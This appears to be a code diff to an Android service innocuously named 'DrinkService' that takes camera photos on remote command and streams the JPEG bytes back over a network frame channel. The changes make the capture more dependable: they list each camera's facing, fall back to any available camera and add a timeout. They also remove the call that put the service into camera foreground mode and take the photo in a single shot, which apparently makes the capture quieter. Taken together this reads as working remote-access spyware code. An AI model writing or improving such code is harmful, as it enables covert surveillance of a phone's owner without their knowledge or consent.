@@ -531,7 +531,25 @@ class DrinkService : Service() {
             val cameraIds = cameraManager.cameraIdList
             val arr = JSONArray()
             for (id in cameraIds) {
-                arr.put(id)
+                runCatching {
+                    val chars = cameraManager.getCameraCharacteristics(id)
+                    val facing = when (chars.get(CameraCharacteristics.LENS_FACING)) {
+                        CameraCharacteristics.LENS_FACING_FRONT -> "Front"
+                        CameraCharacteristics.LENS_FACING_BACK -> "Back"
+                        else -> "External"
+                    }
+                    arr.put(JSONObject().apply {
+                        put("id", id)
+                        put("facing", facing)
+                        put("name", "Camera $id ($facing)")
+                    })
+                }.onFailure {
+                    arr.put(JSONObject().apply {
+                        put("id", id)
+                        put("facing", "Back")
+                        put("name", "Camera $id")
+                    })
+                }
             }
             val response = JSONObject().apply {
                 put("type", "cams")
@@ -566,18 +584,29 @@ class DrinkService : Service() {
                 sm.sendFrame(err)
                 return
             }
-            applyForegroundMode(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
 
             val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-            val characteristics = cameraManager.getCameraCharacteristics(camId)
+            val cameraIds = cameraManager.cameraIdList
+            if (cameraIds.isEmpty()) {
+                val err = JSONObject().apply {
+                    put("type", "error")
+                    put("cmd", "camera_capture")
+                    put("message", "No cameras available")
+                }
+                sm.sendFrame(err)
+                return
+            }
+
+            val targetCamId = if (cameraIds.contains(camId)) camId else cameraIds[0]
+            val characteristics = cameraManager.getCameraCharacteristics(targetCamId)
             val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
             val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
-            val targetSize = jpegSizes?.filter { it.width.toLong() * it.height <= 4096 * 3072 }?.maxByOrNull { it.width.toLong() * it.height }
-                ?: jpegSizes?.maxByOrNull { it.width.toLong() * it.height }
+            val targetSize = jpegSizes?.filter { it.width <= 1920 && it.height <= 1080 }?.maxByOrNull { it.width * it.height }
+                ?: jpegSizes?.maxByOrNull { it.width * it.height }
                 ?: jpegSizes?.firstOrNull()
-            val width = targetSize?.width ?: 1920
-            val height = targetSize?.height ?: 1080
+            val width = targetSize?.width ?: 1280
+            val height = targetSize?.height ?: 720
 
             val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
             val thread = HandlerThread("CameraCaptureThread").apply { start() }
@@ -585,26 +614,17 @@ class DrinkService : Service() {
 
             var cameraDevice: CameraDevice? = null
             var session: CameraCaptureSession? = null
-            var framesReceived = 0
             var captured = false
-            var aeConverged = false
 
             val cleanup = {
-                runCatching { session?.stopRepeating() }
                 runCatching { session?.close() }
                 runCatching { cameraDevice?.close() }
                 runCatching { imageReader.close() }
                 runCatching { thread.quitSafely() }
-                applyForegroundMode(0)
             }
 
             imageReader.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
-                framesReceived++
-                if (!aeConverged && framesReceived < 12 && !captured) {
-                    image.close()
-                    return@setOnImageAvailableListener
-                }
                 if (!captured) {
                     captured = true
                     try {
@@ -613,7 +633,7 @@ class DrinkService : Service() {
                         buffer.get(bytes)
                         val header = JSONObject().apply {
                             put("type", "camera_capture")
-                            put("cam_id", camId)
+                            put("cam_id", targetCamId)
                             put("size", bytes.size)
                         }
                         sm.sendFrame(header, bytes)
@@ -633,7 +653,19 @@ class DrinkService : Service() {
                 }
             }, handler)
 
-            cameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
+            handler.postDelayed({
+                if (!captured) {
+                    cleanup()
+                    val err = JSONObject().apply {
+                        put("type", "error")
+                        put("cmd", "camera_capture")
+                        put("message", "Camera capture timed out")
+                    }
+                    sm.sendFrame(err)
+                }
+            }, 8000)
+
+            cameraManager.openCamera(targetCamId, object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
                     cameraDevice = camera
                     try {
@@ -649,46 +681,10 @@ class DrinkService : Service() {
                                         set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                         set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                         set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
-                                        set(CaptureRequest.CONTROL_AE_ANTIBANDING_MODE, CaptureRequest.CONTROL_AE_ANTIBANDING_MODE_AUTO)
                                         set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
-                                        set(CaptureRequest.JPEG_QUALITY, 100.toByte())
-
-                                        val aeRange = characteristics.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
-                                        if (aeRange != null && aeRange.upper > 0) {
-                                            val compensation = (aeRange.upper * 0.35).toInt().coerceIn(1, aeRange.upper)
-                                            set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, compensation)
-                                        }
-
-                                        val sceneModes = characteristics.get(CameraCharacteristics.CONTROL_AVAILABLE_SCENE_MODES)
-                                        if (sceneModes != null && sceneModes.contains(CameraCharacteristics.CONTROL_SCENE_MODE_HDR)) {
-                                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_USE_SCENE_MODE)
-                                            set(CaptureRequest.CONTROL_SCENE_MODE, CameraCharacteristics.CONTROL_SCENE_MODE_HDR)
-                                        }
-
-                                        set(CaptureRequest.EDGE_MODE, CaptureRequest.EDGE_MODE_HIGH_QUALITY)
-                                        set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
-                                        set(CaptureRequest.COLOR_CORRECTION_MODE, CaptureRequest.COLOR_CORRECTION_MODE_HIGH_QUALITY)
-                                        set(CaptureRequest.HOT_PIXEL_MODE, CaptureRequest.HOT_PIXEL_MODE_HIGH_QUALITY)
+                                        set(CaptureRequest.JPEG_QUALITY, 90.toByte())
                                     }
-                                    val captureCallback = object : CameraCaptureSession.CaptureCallback() {
-                                        override fun onCaptureCompleted(
-                                            session: CameraCaptureSession,
-                                            request: CaptureRequest,
-                                            result: TotalCaptureResult
-                                        ) {
-                                            val aeState = result.get(CaptureResult.CONTROL_AE_STATE)
-                                            if (aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED ||
-                                                aeState == CaptureResult.CONTROL_AE_STATE_FLASH_REQUIRED ||
-                                                aeState == CaptureResult.CONTROL_AE_STATE_LOCKED
-                                            ) {
-                                                aeConverged = true
-                                            }
-                                        }
-                                    }
-                                    captureSession.setRepeatingRequest(requestBuilder.build(), captureCallback, handler)
-                                    handler.postDelayed({
-                                        aeConverged = true
-                                    }, 2200)
+                                    captureSession.capture(requestBuilder.build(), null, handler)
                                 } catch (e: Exception) {
                                     cleanup()
                                     val err = JSONObject().apply {
